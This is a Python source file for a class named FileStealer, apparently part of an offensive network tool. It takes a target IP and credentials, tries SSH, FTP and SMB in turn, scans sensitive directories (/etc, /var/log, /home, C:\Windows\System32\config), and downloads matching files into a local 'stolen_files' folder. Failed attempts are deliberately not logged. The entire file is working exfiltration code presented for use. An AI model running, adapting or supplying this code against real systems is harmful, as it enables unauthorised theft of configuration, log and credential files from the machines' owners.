import os
import paramiko
import ftplib
from smb.SMBConnection import SMBConnection
from utils.logger import Logger
import socket
import logging

# Suppress verbose SMB logs
logging.getLogger("SMB.SMBConnection").setLevel(logging.ERROR)

class FileStealer:
    def __init__(self, logger=None, output_dir="./stolen_files"):
        """
        Initialize the FileStealer class.

        Parameters:
            logger (Logger, optional): An instance of the Logger class for logging activities.
                                       If none is provided, a new Logger instance is created.
            output_dir (str, optional): The directory where stolen files will be saved.
                                        Defaults to "./stolen_files".

        Attributes:
            output_dir (str): The directory for storing stolen files.
        """

        self.logger = logger if logger else Logger()
        self.output_dir = output_dir
        os.makedirs(self.output_dir, exist_ok=True)

    def is_ssh_service(self, target_ip, port=22, timeout=5):
        """
        Check if the target port is an SSH service.

        Parameters:
            target_ip (str): The IP address of the target device.
            port (int, optional): The port to check for SSH. Defaults to 22.
            timeout (int, optional): The timeout in seconds for the connection attempt. Defaults to 5.

        Returns:
            bool: True if the port is an SSH service, False otherwise.
        """

        try:
            sock = socket.create_connection((target_ip, port), timeout=timeout)
            banner = sock.recv(1024).decode("utf-8", "ignore")
            sock.close()
            return "SSH" in banner
        except Exception:
            return False  # Suppress intermediate logs for SSH check

    def attempt_ssh(self, target_ip, username, password, directories, file_extensions):
        """
        Attempt to connect to the target via SSH and steal files.

        Parameters:
            target_ip (str): The IP address of the target device.
            username (str): The SSH username.
            password (str): The SSH password.
            directories (list): List of directories to scan on the target.
            file_extensions (list): List of file extensions to target for stealing.

        Returns:
            bool: True if files were successfully stolen via SSH, False otherwise.
        """

        if not self.is_ssh_service(target_ip):
            return False  # Skip logging; only log final result in steal_files()

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(target_ip, username=username, password=password, timeout=10)
            self.scan_and_steal_ssh(client, target_ip, directories, file_extensions)
            client.close()
            return True
        except Exception:
            pass  # Suppress logs for failed attempts
        finally:
            client.close()
        return False

    def attempt_ftp(self, target_ip, username, password, directories, file_extensions):
        """
        Attempt to connect to the target via FTP and steal files.

        Parameters:
            target_ip (str): The IP address of the target device.
            username (str): The FTP username.
            password (str): The FTP password.
            directories (list): List of directories to scan on the target.
            file_extensions (list): List of file extensions to target for stealing.

        Returns:
            bool: True if files were successfully stolen via FTP, False otherwise.
        """

        try:
            ftp = ftplib.FTP(target_ip)
            ftp.login(user=username, passwd=password)
            self.scan_and_steal_ftp(ftp, target_ip, directories, file_extensions)
            ftp.quit()
            return True
        except Exception:
            pass  # Suppress logs for failed attempts
        return False

    def attempt_smb(self, target_ip, username, password, directories, file_extensions):
        """
        Attempt to connect to the target via SMB and steal files.

        Parameters:
            target_ip (str): The IP address of the target device.
            username (str): The SMB username.
            password (str): The SMB password.
            directories (list): List of directories to scan on the target.
            file_extensions (list): List of file extensions to target for stealing.

        Returns:
            bool: True if files were successfully stolen via SMB, False otherwise.
        """

        conn = SMBConnection(username, password, "local_machine", "remote_machine", use_ntlm_v2=True)
        try:
            if conn.connect(target_ip, 139):
                self.scan_and_steal_smb(conn, target_ip, directories, file_extensions)
                conn.close()
                return True
        except Exception:
            pass  # Suppress logs for failed attempts
        return False

    def get_os_specific_file_targets(self, os_type):
        """
        Dynamically define target directories and file extensions based on the operating system.

        Parameters:
            os_type (str): The operating system type (e.g., "linux", "windows").

        Returns:
            tuple: A tuple containing:
                - directories (list): List of directories to target.
                - file_extensions (list): List of file extensions to target.
        """

        if os_type.lower() == "linux":
            directories = ["/etc", "/var/log", "/home"]
            file_extensions = [".conf", ".log", ".sh", ".txt"]
        elif os_type.lower() == "windows":
            directories = ["C:\\Users\\Public", "C:\\Windows\\System32\\config"]
            file_extensions = [".ini", ".log", ".txt"]
        else:
            directories = ["/tmp"]  # Default fallback for unknown OS
            file_extensions = [".txt", ".log"]

        return directories, file_extensions

    def steal_files(self, target_ip, username, password, os_type):
        """
        Main method to steal files from the target using SSH, FTP, and SMB protocols.

        Parameters:
            target_ip (str): The IP address of the target device.
            username (str): The username for authentication.
            password (str): The password for authentication.
            os_type (str): The operating system of the target device (e.g., "linux", "windows").

        Returns:
            bool: True if files were successfully stolen using any protocol, False otherwise.
        """

        # Get OS-specific directories and file extensions
        directories, file_extensions = self.get_os_specific_file_targets(os_type)

        protocols = ["ssh", "ftp", "smb"]
        success = False

        for protocol in protocols:
            if protocol == "ssh" and self.attempt_ssh(target_ip, username, password, directories, file_extensions):
                success = True
                break
            elif protocol == "ftp" and self.attempt_ftp(target_ip, username, password, directories, file_extensions):
                success = True
                break
            elif protocol == "smb" and self.attempt_smb(target_ip, username, password, directories, file_extensions):
                success = True
                break

        # Log the final result once
        if success:
            self.logger.log(f"[SUCCESS] Successfully stole files from {target_ip}.")
        elif not success:
            if not hasattr(self, '_failed_ips_logged'):
                self._failed_ips_logged = set()
            if target_ip not in self._failed_ips_logged:
                self.logger.log(f"[FAILED] File stealing failed for IP: {target_ip}.")
                self._failed_ips_logged.add(target_ip)

        return success

    def scan_and_steal_ssh(self, client, target_ip, directories, file_extensions):
        """
        Scan and steal files over SSH.

        Parameters:
            client (paramiko.SSHClient): An active SSH client connection to the target.
            target_ip (str): The IP address of the target device.
            directories (list): List of directories to scan on the target.
            file_extensions (list): List of file extensions to target for stealing.
        """

        try:
            sftp = client.open_sftp()
            for directory in directories:
                self.logger.log(f"[INFO] Scanning directory {directory} on {target_ip} via SSH.")
                try:
                    for file_attr in sftp.listdir_attr(directory):
                        file_name = file_attr.filename
                        file_path = f"{directory}/{file_name}"
                        if any(file_name.endswith(ext) for ext in file_extensions):
                            local_path = os.path.join(self.output_dir, f"{target_ip}_{file_name}")
                            self.logger.log(f"[INFO] Downloading {file_path} to {local_path}.")
                            sftp.get(file_path, local_path)
                except Exception as e:
                    self.logger.log(f"[ERROR] Failed to list or download files from {directory}: {e}")
            sftp.close()
        except Exception as e:
            self.logger.log(f"[ERROR] SSH file stealing failed for {target_ip}: {e}")

    def scan_and_steal_ftp(self, ftp, target_ip, directories, file_extensions):
        """
        Scan and steal files over FTP.

        Parameters:
            ftp (ftplib.FTP): An active FTP client connection to the target.
            target_ip (str): The IP address of the target device.
            directories (list): List of directories to scan on the target.
            file_extensions (list): List of file extensions to target for stealing.
        """

        try:
            for directory in directories:
                self.logger.log(f"[INFO] Scanning directory {directory} on {target_ip} via FTP.")
                try:
                    ftp.cwd(directory)
                    for file_name in ftp.nlst():
                        if any(file_name.endswith(ext) for ext in file_extensions):
                            local_path = os.path.join(self.output_dir, f"{target_ip}_{file_name}")
                            self.logger.log(f"[INFO] Downloading {file_name} to {local_path}.")
                            with open(local_path, "wb") as f:
                                ftp.retrbinary(f"RETR {file_name}", f.write)
                except Exception as e:
                    self.logger.log(f"[ERROR] Failed to list or download files from {directory}: {e}")
        except Exception as e:
            self.logger.log(f"[ERROR] FTP file stealing failed for {target_ip}: {e}")

    def scan_and_steal_smb(self, conn, target_ip, directories, file_extensions):
        """
        Scan and steal files over SMB.

        Parameters:
            conn (SMBConnection): An active SMB client connection to the target.
            target_ip (str): The IP address of the target device.
            directories (list): List of directories to scan on the target.
            file_extensions (list): List of file extensions to target for stealing.
        """

        try:
            for directory in directories:
                self.logger.log(f"[INFO] Scanning directory {directory} on {target_ip} via SMB.")
                try:
                    shared_files = conn.listPath("SHARE", directory)
                    for file in shared_files:
                        file_name = file.filename
                        if any(file_name.endswith(ext) for ext in file_extensions):
                            local_path = os.path.join(self.output_dir, f"{target_ip}_{file_name}")
                            self.logger.log(f"[INFO] Downloading {file_name} to {local_path}.")
                            with open(local_path, "wb") as f:
                                conn.retrieveFile("SHARE", f"{directory}/{file_name}", f)
                except Exception as e:
                    self.logger.log(f"[ERROR] Failed to list or download files from {directory}: {e}")
        except Exception as e:
            self.logger.log(f"[ERROR] SMB file stealing failed for {target_ip}: {e}")
